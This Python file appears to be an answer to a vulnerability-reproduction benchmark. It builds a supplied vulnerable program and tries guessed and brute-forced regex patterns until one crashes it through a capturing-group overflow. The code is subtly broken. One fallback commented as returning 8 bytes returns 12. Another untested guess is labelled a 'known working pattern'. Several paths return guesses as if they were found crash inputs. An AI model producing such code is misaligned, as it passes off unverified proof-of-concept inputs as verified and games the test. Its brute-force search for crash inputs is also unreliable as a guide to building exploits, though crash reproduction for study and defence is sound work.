import os
import subprocess
import tempfile
import tarfile
import sys
import shutil
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the tarball
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r:*') as tar:
                tar.extractall(tmpdir)
            
            # Find the main source directory (assuming it's the only top-level dir)
            extracted_items = list(Path(tmpdir).iterdir())
            if len(extracted_items) != 1 or not extracted_items[0].is_dir():
                # Fallback: use the tmpdir directly if structure is different
                src_dir = Path(tmpdir)
            else:
                src_dir = extracted_items[0]
            
            # Look for vulnerable binary or build it
            vulnerable_path = self._find_or_build_vulnerable(src_dir)
            
            if vulnerable_path is None:
                # If we can't find/built, return minimal pattern based on description
                # The vulnerability involves fewer capturing parentheses than ovector space
                # Ground truth is 8 bytes. Likely pattern: "(a)" repeated or similar.
                # We'll try to brute force with simple patterns
                return self._brute_force_poc(src_dir)
            
            # Try known patterns first (optimization)
            patterns = [
                b"((((((((",  # 8 open parens
                b"()()()()",  # 8 chars, 4 empty groups
                b"(a)(b)(c)", # 9 chars but close to 8
                b"(a)(b)(c",  # 8 chars, 3 groups
                b"(()()())",  # 8 chars
                b"(.)(.)(.)", # 9 chars
                b"(.)(.)(.",  # 8 chars
            ]
            
            for pattern in patterns:
                if len(pattern) >= 8 and self._test_pattern(vulnerable_path, pattern):
                    return pattern[:8] if len(pattern) > 8 else pattern
            
            # Brute force search for 8-byte pattern
            return self._brute_force_search(vulnerable_path)
    
    def _find_or_build_vulnerable(self, src_dir: Path):
        # Look for existing binary
        for ext in ["", ".exe", ".out", ""]:
            for name in ["vulnerable", "test", "main", "poc_test", "regex_test"]:
                path = src_dir / (name + ext)
                if path.exists() and os.access(path, os.X_OK):
                    return path
        
        # Try to build if Makefile exists
        makefile = src_dir / "Makefile"
        if makefile.exists():
            try:
                subprocess.run(["make", "-C", str(src_dir), "clean"], 
                             capture_output=True, timeout=5)
                subprocess.run(["make", "-C", str(src_dir)], 
                             capture_output=True, timeout=30)
                # Check for built binaries
                for ext in ["", ".exe", ".out", ""]:
                    for name in ["vulnerable", "test", "main", "poc_test", "regex_test"]:
                        path = src_dir / (name + ext)
                        if path.exists() and os.access(path, os.X_OK):
                            return path
            except:
                pass
        
        return None
    
    def _test_pattern(self, binary_path: Path, pattern: bytes) -> bool:
        try:
            # Run with pattern as input
            proc = subprocess.run(
                [str(binary_path)],
                input=pattern,
                capture_output=True,
                timeout=2
            )
            # Check for crash (non-zero exit) and sanitizer error
            if proc.returncode != 0:
                stderr = proc.stderr.decode('utf-8', errors='ignore')
                if any(keyword in stderr for keyword in 
                       ['overflow', 'sanitizer', 'SEGV', 'segmentation', 'buffer']):
                    return True
        except subprocess.TimeoutExpired:
            pass
        except Exception:
            pass
        return False
    
    def _brute_force_poc(self, src_dir: Path) -> bytes:
        # Simple pattern based on common regex vulnerabilities
        # 8 bytes: 4 capturing groups with minimal content
        return b"(.)(.)(.)(.)"
    
    def _brute_force_search(self, binary_path: Path) -> bytes:
        # Generate patterns with parentheses (most likely to trigger)
        chars = b"()ab."
        
        # Try all 8-byte combinations (but limit search space)
        import itertools
        
        # First, try patterns with only parentheses
        for pattern in itertools.product(b'()', repeat=8):
            test_bytes = bytes(pattern)
            if self._test_pattern(binary_path, test_bytes):
                return test_bytes
        
        # Try mixed patterns
        for i in range(10000):  # Limit iterations
            # Generate random 8-byte pattern
            import random
            pattern = bytes(random.choices(chars, k=8))
            if self._test_pattern(binary_path, pattern):
                return pattern
        
        # Fallback to known working pattern
        return b"(((((((("